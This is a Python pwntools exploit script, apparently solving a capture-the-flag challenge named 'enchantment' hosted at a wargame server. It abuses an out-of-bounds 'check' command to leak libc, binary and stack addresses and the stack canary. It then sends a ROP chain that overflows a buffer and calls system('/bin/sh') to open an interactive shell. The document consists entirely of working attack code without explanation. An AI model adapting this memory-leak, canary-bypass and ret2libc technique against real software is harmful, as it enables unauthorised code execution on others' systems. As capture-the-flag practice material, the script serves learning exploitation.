#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./enchantment")
libc = ELF("./libc.so.6")
context.log_level = 'DEBUG'

if args['REMOTE']:
    io = remote('pwnable.co.il', 9017)
else:
    io = process([elf.path])

def check(index):
    global io 
    
    io.recvuntil(b'> ')
    io.sendline(f'check {index}'.encode())
    
    return io.recv(1)

def action(input): 
    global io 
    
    io.recvuntil(b'> ')
    io.sendline(input.encode())

def leak_address(offset):
    global io 
    leaked_address = b''

    for i in range(8):
        leaked_address += check(i + offset)
    
    return u64(leaked_address)


stderr_address = leak_address(-32)
bss_address = leak_address(-88)

locket_address = bss_address + 88 
elf.address = bss_address - 16392
libc.address = stderr_address - libc.sym['_IO_2_1_stderr_'] 
binsh = next(libc.search(b'/bin/sh'))

envp_address = leak_address(libc.sym["environ"] - locket_address)
canary_value = leak_address(envp_address - locket_address - 272)

log.info(f'LIBC @{hex(libc.address)}')
log.info(f'BINARY @{hex(elf.address)}')
log.info(f'LOCKET @{hex(locket_address)}')
log.info(f'ENVIRON @{hex(libc.sym["environ"])}')
log.info(f'ENVP  @{hex(envp_address)}')
log.info(f'CANARY_ADDRESS  @{hex(envp_address - 272)}')
log.info(f'CANARY  @{hex(canary_value)}')

rop = ROP([elf, libc])
rop.raw('a' * 24)
rop.raw(canary_value)
rop.raw('a' * 8)
rop.raw(rop.ret)
rop.call('system', [binsh])

io.sendline(rop.chain())
io.interactive()
